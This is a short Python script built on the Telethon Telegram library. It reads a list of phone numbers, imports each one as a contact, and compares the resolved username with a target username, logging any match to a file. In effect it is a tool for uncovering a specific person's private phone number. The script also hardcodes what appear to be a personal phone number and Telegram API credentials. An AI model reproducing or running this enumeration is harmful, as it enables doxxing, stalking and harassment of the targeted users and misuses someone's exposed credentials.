#!/usr/local/bin/python3
# coded by: tanishk
from telethon import TelegramClient, events, sync
from telethon.errors.rpcerrorlist import SessionPasswordNeededError  # Import SessionPasswordNeededError
from telethon.tl.types import InputPhoneContact
from telethon import functions, types

def check(phone_number, usr):
    try:
        contact = InputPhoneContact(client_id=0, phone=phone_number, first_name="__test__", last_name="__last_test__")
        contacts = client(functions.contacts.ImportContactsRequest([contact]))
        username = contacts.to_dict()['users'][0]['username']
        return username
        dell = client(functions.contacts.DeleteContactsRequest(id=[username]))
    except:
        res = "__err__"
        return res

def list_checker():
    list_file = input("List of numbers: ")
    usr = input("Username Target: ")
    list = open(list_file, 'r').read().splitlines()
    for num in list:
        try:
            ress = check(num, usr)
            if ress == '__err__':
                print("Number: {} <{}>".format(num, "ERROR!"))
            elif ress.lower() == usr.lower():
                f = open("hit.txt", "a")
                f.write(ress + ":" + num)
                f.close()
                print("Number: {} <{}>".format(num, "OK:)"))
                break
            else:
                print("Null")
        except:
            print("Null")

if __name__ == '__main__':
    phone = '+916369855378'
    client = TelegramClient(phone, 23031845, 'bb15baaded1304002f666794ed2e12f9')
    client.connect()
    try:
        if not client.is_user_authorized():
            client.send_code_request(phone)
            code = input('Enter the code: ')
            try:
                client.sign_in(phone, code)
            except SessionPasswordNeededError:
                password = input('Enter your 2FA password: ')
                client.sign_in(password=password)
    except Exception as e:
        print("Error:", e)
    list_checker()
